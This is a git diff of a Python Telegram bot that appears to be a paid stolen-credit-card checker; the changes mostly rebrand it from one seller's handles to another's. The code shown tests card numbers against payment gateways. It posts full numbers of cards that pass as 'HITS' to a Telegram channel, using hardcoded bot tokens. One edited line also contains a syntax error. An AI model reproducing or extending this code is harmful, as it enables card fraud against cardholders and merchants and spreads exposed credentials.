@@ -68,8 +68,8 @@ YOUR CURRENT PLAN IS :  {BL}</b>
 	''',reply_markup=keyboard)
 			return
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥", url="https://t.me/lakshayfr")
-		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
+		contact_button = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥", url="https://t.me/Naughtyxd")
+		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/Naughtyxd")
 		keyboard.add(contact_button, ahmed)
 		username = message.from_user.first_name
 		random_number = random.randint(33, 82)
@@ -97,7 +97,7 @@ COMMANDS FOR THE BOT :
 ━━━━━━━━━━━━
 3𝗗 𝗟𝗢𝗢𝗞𝗨𝗣 > <code>/vbv number|mm|yy|cvc</code>
 𝗢𝗡𝗟𝗜𝗡𝗘 ✅
-MUST JOIN @HyperCheckerUpdates 
+owner @Naughtyxd 
 </b>
 ''',reply_markup=keyboard)
 @bot.message_handler(content_types=["document"])
@@ -124,8 +124,8 @@ def main(message):
 			with open('data.json', 'w') as json_file:
 				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
 			keyboard = types.InlineKeyboardMarkup()
-			contact_button = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥", url="https://t.me/lakshayfr")
-			ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
+			contact_button = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥", url="https://t.me/Naughtyxd")
+			ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/Naughtyxd")
 			keyboard.add(contact_button, ahmed)
 			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
 OH, SEEMS LIKE YOU DO NOT HAVE ANY ACTIVE SUBSCRIPTION {BL}</b>
@@ -138,8 +138,8 @@ OH, SEEMS LIKE YOU DO NOT HAVE ANY ACTIVE SUBSCRIPTION {BL}</b>
 			provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
 		except Exception as e:
 			keyboard = types.InlineKeyboardMarkup()
-			ahmed = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥", url="https://t.me/lakshayfr")
-			contact_button = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
+			ahmed = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥", url="https://t.me/Naughtyxd")
+			contact_button = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/Naughtyxd")
 			keyboard.add(contact_button, ahmed)
 			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
 Hello Welcome to Hyper Checker
@@ -155,8 +155,8 @@ YOUR CURRENT PLAN IS :  {BL}</b>
 		required_duration = timedelta(hours=0)
 		if current_time - provided_time > required_duration:
 			keyboard = types.InlineKeyboardMarkup()
-			ahmed = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥", url="https://t.me/lakshayfr")
-			contact_button = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
+			ahmed = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥", url="https://t.me/Naughtyxd")
+			contact_button = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/Naughtyxd")
 			keyboard.add(contact_button, ahmed)
 			bot.send_message(chat_id=message.chat.id, text=f'''YOUR SSUBSCRIPTION HAS BEEN EXPIRED!</b>
 		''',reply_markup=keyboard)
@@ -198,7 +198,7 @@ def menu_callback(call):
 			}
 				for cc in lino:
 					if stopuser[f'{id}']['status'] == 'stop':
-						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text=' MAGIC STOPPED ✅\nDEV ➜ @lakshayfr')
+						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text=' MAGIC STOPPED ✅\nDEV ➜ @Naughtyxd')
 						return
 					try:
 						data = requests.get('https://binlist.io/lookup/'+cc[:6]).json()
@@ -258,7 +258,7 @@ def menu_callback(call):
 					bot.edit_message_text(chat_id=call.message.chat.id, 
 					  message_id=call.message.message_id, 
 					  text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
-𝘽𝙤𝙩 𝘽𝙮 @lakshayfr''', reply_markup=mes)
+𝘽𝙤𝙩 𝘽𝙮 @Naughtyxd''', reply_markup=mes)
 
 					msg=f'''<b>𝑪𝑯𝑨𝑹𝑮𝑬 ✅
 			- - - - - - - - - - - - - - - - - - - - - - -
@@ -282,7 +282,7 @@ def menu_callback(call):
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @lakshayfr
+◆ 𝑩𝒀: @Naughtyxd
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 					msgf=f'''<b>𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 ☑️
 			- - - - - - - - - - - - - - - - - - - - - - -
@@ -294,22 +294,22 @@ def menu_callback(call):
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @lakshayfr
+◆ 𝑩𝒀: @Naughtyxd
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 					if 'success' in last:
 						tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
 						acc =  '-1002246001656'
 						mg = f"""<b> 
-❆═══» LAKSHAY'S HITS  «═══❆
+❆═══» NAUGHTY'S HITS  «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
 ❆═══» 𝙸𝙽𝙵𝙾 «═══❆
 ｢𝙱𝙸𝙽」➔ {cc[:6]}
 ｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
 ｢𝙱𝙰𝙽𝙺」➔ {bank}
 ｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
-❆═══» LAKSHAY'S HITS  «═══❆
+❆═══» NAUGHTY'S HITS  «═══❆
 ✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ 
-✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @lakshayfr  
+✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Naughtyxd
 </b>"""
 						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 						tlg_params = {"parse_mode": "HTML"}
@@ -321,16 +321,16 @@ def menu_callback(call):
 						tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
 						acc =  '-1002246001656'
 						mg = f"""<b> 
-❆═══» LAKSHAY'S HITS  «═══❆
+❆═══» NAUGHTY'S HITS  «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
 ❆═══» 𝙸𝙽𝙵𝙾 «═══❆
 ｢𝙱𝙸𝙽」➔ {cc[:6]}
 ｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
 ｢𝙱𝙰𝙽𝙺」➔ {bank}
 ｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
-❆═══» LAKSHAY'S HITS  «═══❆
-✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @lakshayfr
-✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @lakshayfr 
+❆═══» NAUGHTY'S HITS  «═══❆
+✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @Naughtyxd
+✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Naughtyxd
 </b>"""
 						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 						tlg_params = {"parse_mode": "HTML"}
@@ -342,16 +342,16 @@ def menu_callback(call):
 						tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
 						acc =  '-1002246001656'
 						mg = f"""<b> 
-❆═══» LAKSHAY'S HITS  «═══❆
+❆═══» NAUGHTY'S HITS  «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
 ❆═══» 𝙸𝙽𝙵𝙾 «═══❆
 ｢𝙱𝙸𝙽」➔ {cc[:6]}
 ｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
 ｢𝙱𝙰𝙽𝙺」➔ {bank}
 ｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
-❆═══» LAKSHAY'S HITS  «═══❆
+❆═══» Naughtyxd'S HITS  «═══❆
 ✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ 
-✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @lakshayfr
+✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Naughtyxd
 </b>"""
 						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 						tlg_params = {"parse_mode": "HTML"}
@@ -367,7 +367,7 @@ def menu_callback(call):
 		stopuser[f'{id}']['status'] = 'start'
 		bot.edit_message_text(chat_id=call.message.chat.id, 
 					  message_id=call.message.message_id, 
-					  text='MAGIC COMPLETED ✅\nDEV ➜ @lakshayfr')
+					  text='MAGIC COMPLETED ✅\nDEV ➜ @Naughtyxd')
 	my_thread = threading.Thread(target=my_function)
 	my_thread.start()
 @bot.callback_query_handler(func=lambda call: call.data == 'br')
@@ -392,7 +392,7 @@ def menu_callback(call):
 			}
 				for cc in lino:
 					if stopuser[f'{id}']['status'] == 'stop':
-						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='MAGIC STOPPED ✅\nDEV ➜ @lakshayfr')
+						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='MAGIC STOPPED ✅\nDEV ➜ @Naughtyxd')
 						return
 					try:
 						data = requests.get('https://binlist.io/lookup/'+cc[:6]).json()
@@ -454,7 +454,7 @@ def menu_callback(call):
 					bot.edit_message_text(chat_id=call.message.chat.id, 
 					  message_id=call.message.message_id, 
 					  text=f'''PLEASE WAIT YOUR CARDS ARE BEING CHECKED :  {gate}
-𝘽𝙤𝙩 𝘽𝙮 @lakshayfr''', reply_markup=mes)
+𝘽𝙤𝙩 𝘽𝙮 @Naughtyxd''', reply_markup=mes)
 					
 					msg=f''' HITS (APPROVED) ✅
 			
@@ -465,7 +465,7 @@ def menu_callback(call):
 𝘽𝙞𝙣 ➼ <code>{cc[:6]} - {card_type} - {brand}</code>
 𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
-𝗕𝗼𝘁 𝗕𝘆: @lakshayfr'''
+𝗕𝗼𝘁 𝗕𝘆: @Naughtyxd'''
 					msgc=f''' 𝘾𝘾𝙉 ☑️
 			
 𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
@@ -475,22 +475,22 @@ def menu_callback(call):
 𝘽𝙞𝙣 ➼ <code>{cc[:6]} - {card_type} - {brand}</code>
 𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
-𝗕𝗼𝘁 𝗕𝘆: @lakshayfr'''
+𝗕𝗼𝘁 𝗕𝘆: @Naughtyxd'''
 
 					if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
 						tok ='7103663429:AAHshq4iqHzboZucTQnhO3EqZ7akeews--E'
 						acc =  '-1002246001656'
 						mg = f"""<b> 
-❆═══» LAKSHAY'S HITS  «═══❆
+❆═══» NAUGHTY'S HITS  «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
 ❆═══» 𝙸𝙽𝙵𝙾 «═══❆
 ｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
 ｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
 ｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
 ｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
-❆═══» LAKSHAY'S HITS  «═══❆
+❆═══» NAUGHTY'S HITS  «═══❆
 ✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ 
-✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @lakshayfr
+✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Naughtyxd
 </b>"""
 						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 						tlg_params = {"parse_mode": "HTML"}
@@ -505,14 +505,14 @@ def menu_callback(call):
 						tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
 						acc =  '-1002246001656'
 						mg = f"""<b> 
-❆═══» LAKSHAY'S HITS  «═══❆
+❆═══» NAUGHTY'S HITS  «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
 ❆═══» 𝙸𝙽𝙵𝙾 «═══❆
 ｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
 ｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
 ｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
 ｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
-❆═══» LAKSHAY'S HITS  «═══❆
+❆═══» NAUGHTY'S HITS  «═══❆
  
 </b>"""
 						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
@@ -529,7 +529,7 @@ def menu_callback(call):
 		stopuser[f'{id}']['status'] = 'start'
 		bot.edit_message_text(chat_id=call.message.chat.id, 
 					  message_id=call.message.message_id, 
-					  text= ' MAGIC STOPPED ✅\nDEV ➜ @lakshayfr')
+					  text= ' MAGIC STOPPED ✅\nDEV ➜ @Naughtyxd')
 	my_thread = threading.Thread(target=my_function)
 	my_thread.start()
 @bot.message_handler(func=lambda message: message.text.lower().startswith('.au') or message.text.lower().startswith('/au'))
@@ -557,8 +557,8 @@ def respond_to_vbv(message):
 		BL='𝗙𝗥𝗘𝗘'
 	if BL == '𝗙𝗥𝗘𝗘':
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/lakshayfr")
-		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
+		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/Naughtyxd")
+		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/Naughtyxd")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>HII {name}
  Welcome to Hyper Checker
@@ -577,11 +577,11 @@ your current plan is :{BL}</b>
 		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
 	except Exception as e:
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/lakshayfr")
-		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
+		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/Naughtyxd")
+		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/Naughtyxd")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>HII {name}
- Welcome to Hyper Checker
+ Welcome to Naughty's Checker
 
 Status-ALIVE
 
@@ -594,8 +594,8 @@ YOUR CURRENT PLAN IS : {BL}</b>
 	required_duration = timedelta(hours=0)
 	if current_time - provided_time > required_duration:
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/lakshayfr")
-		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
+		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/Naughtyxd")
+		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/Naughtyxd")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b> OH , YOUR SUBSCRIPTION HAS EXPIRED </b>
 	''',reply_markup=keyboard)
@@ -611,7 +611,7 @@ YOUR CURRENT PLAN IS : {BL}</b>
 				'last_time': datetime.now()
 			}
 	if command_usage[idt]['last_time'] is not None:
-		time_diff = (current_time - command_usage[idt]['last_time']).seconds
+		time_diff 8= (current_time - command_usage[idt]['last_time']).seconds
 		if time_diff < 30:
 			bot.reply_to(message, f"<b>Try again after {30-time_diff} seconds.</b>",parse_mode="HTML")
 			return	
@@ -680,20 +680,20 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @lakshayfr
+◆ 𝑩𝒀: @Naughtyxd
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'live' in last:
 		tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
 		acc =  '-1002246001656'
 		mg = f"""<b> 
-❆═══» LAKSHAY'S HITS  «═══❆
+❆═══» NAUGHTY'S HITS  «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
 ❆═══» 𝙸𝙽𝙵𝙾 «═══❆
 ｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
 ｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
 ｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
 ｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
-❆═══» LAKSHAY'S HITS  «═══❆  
+❆═══» NAUGHTY'S HITS  «═══❆  
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 		tlg_params = {"parse_mode": "HTML"}
@@ -734,11 +734,11 @@ def respond_to_vbv(message):
 		BL='𝗙𝗥𝗘𝗘'
 	if BL == '𝗙𝗥𝗘𝗘':
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/lakshayfr")
-		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
+		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/Naughtyxd")
+		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/naughtyxd")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b> HII {name}
-  Welcome to Hyper Checker
+  Welcome to NAUGHTY'S Checker
   
 Status-ALIVE
 
@@ -754,11 +754,11 @@ YOUR CURRENT PLAN IS :  {BL}</b>
 		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
 	except Exception as e:
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/lakshayfr")
-		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
+		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/Naughtyxd")
+		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/Naughtyxd")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>HII {name}
-  Welcome to Hyper Checker
+  Welcome to NAUGHTY'S Checker
   
 Status-ALIVE
 
@@ -771,8 +771,8 @@ CURRENT {BL}</b>
 	required_duration = timedelta(hours=0)
 	if current_time - provided_time > required_duration:
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ DEV  ", url="https://t.me/lakshayfr")
-		ahmed = types.InlineKeyboardButton(text="✨ CHANNEL  ", url="https://t.me/hypermpshop")
+		contact_button = types.InlineKeyboardButton(text="✨ DEV  ", url="https://t.me/Naughtyxd")
+		ahmed = types.InlineKeyboardButton(text="✨ CHANNEL  ", url="https://t.me/Naughtyxd")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>OHH ! IT SEEMS LIKE YOUR SUBSRIPTION HAS EXPIRED.</b>
 	''',reply_markup=keyboard)
@@ -844,7 +844,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ⸙ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
 ⸙ 𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
 ⸙ 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
-⸙ 𝗕𝗼𝘁 𝗕𝘆: @lakshayfr</b>'''
+⸙ 𝗕𝗼𝘁 𝗕𝘆: @Naughtyxd</b>'''
 	msgd=f'''<b>DECLINED ❌
 			
 ⸙ 𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
@@ -854,19 +854,19 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ⸙ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
 ⸙ 𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
 ⸙ 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
-⸙ 𝗕𝗼𝘁 𝗕𝘆: @lakshayfr</b>'''
+⸙ 𝗕𝗼𝘁 𝗕𝘆: @Naughtyxd</b>'''
 	if "Funds" in last or 'Insufficient Funds' in last or 'avs' in last or '1000: Approved' in last or 'Duplicate' in last or 'Approved' in last:
 		tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
 		acc =  '-1002246001656'
 		mg = f"""<b> 
-❆═══» LAKSHAY'S HITS  «═══❆
+❆═══» NAUGHTY'S HITS  «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
 ❆═══» 𝙸𝙽𝙵𝙾 «═══❆
 ｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
 ｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
 ｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
 ｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
-❆═══» LAKSHAY'S HITS  «═══❆  
+❆═══» NAUGHTY'S HITS  «═══❆  
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 		tlg_params = {"parse_mode": "HTML"}
@@ -907,12 +907,12 @@ def respond_to_vbv(message):
 		BL='𝗙𝗥𝗘𝗘'
 	if BL == '𝗙𝗥𝗘𝗘':
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ DEV  ", url="https://t.me/lakshayfr")
-		ahmed = types.InlineKeyboardButton(text="✨ CHANNEL  ", url="https://t.me/hypermpshop")
+		contact_button = types.InlineKeyboardButton(text="✨ DEV  ", url="https://t.me/Naughtyxd")
+		ahmed = types.InlineKeyboardButton(text="✨ CHANNEL  ", url="https://t.me/Naughtyxd")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>HII {name}
 
-Welcome to Hyper Checker
+Welcome to NAUGHTY'S Checker
 
 Status-ALIVE
 
@@ -928,8 +928,8 @@ Use /cmds TO KNOW COMMANDS
 		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
 	except Exception as e:
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ DEV  ", url="https://t.me/lakshayfr")
-		ahmed = types.InlineKeyboardButton(text="✨ CHANNEL  ", url="https://t.me/hypermpshop")
+		contact_button = types.InlineKeyboardButton(text="✨ DEV  ", url="https://t.me/Naughtyxd")
+		ahmed = types.InlineKeyboardButton(text="✨ CHANNEL  ", url="https://t.me/Naughtyxd")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>HII {name}
 SEEMS LIKE YOU DO NOT HAVE A ACTIVE SUBSCRIPTION
@@ -941,8 +941,8 @@ SEEMS LIKE YOU DO NOT HAVE A ACTIVE SUBSCRIPTION
 	required_duration = timedelta(hours=0)
 	if current_time - provided_time > required_duration:
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ DEV  ", url="https://t.me/lakshayfr")
-		ahmed = types.InlineKeyboardButton(text="✨ CHANNEL  ", url="https://t.me/hypermpshop")
+		contact_button = types.InlineKeyboardButton(text="✨ DEV  ", url="https://t.me/Naughtyxd")
+		ahmed = types.InlineKeyboardButton(text="✨ CHANNEL  ", url="https://t.me/Naughtyxd")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>OHH ! IT SEEMS LIKE YOUR SUBSRIPTION HAS EXPIRED.</b>
 	''',reply_markup=keyboard)
@@ -1016,7 +1016,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @LAKSHAYFR
+◆ 𝑩𝒀: @Naughtyxd
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	msg=f'''<b>𝑪𝑯𝑨𝑹𝑮𝑬 ✅
 			- - - - - - - - - - - - - - - - - - - - - - -
@@ -1028,7 +1028,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @LAKSHAYFR
+◆ 𝑩𝒀: @Naughtyxd
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	msgc=f'''<b>𝑪𝑪𝑵 ☑️
 			- - - - - - - - - - - - - - - - - - - - - - -
@@ -1040,7 +1040,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @LAKSHAYFR
+◆ 𝑩𝒀: @Naughtyxd
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	msgf=f'''<b>𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 ☑️
 			- - - - - - - - - - - - - - - - - - - - - - -
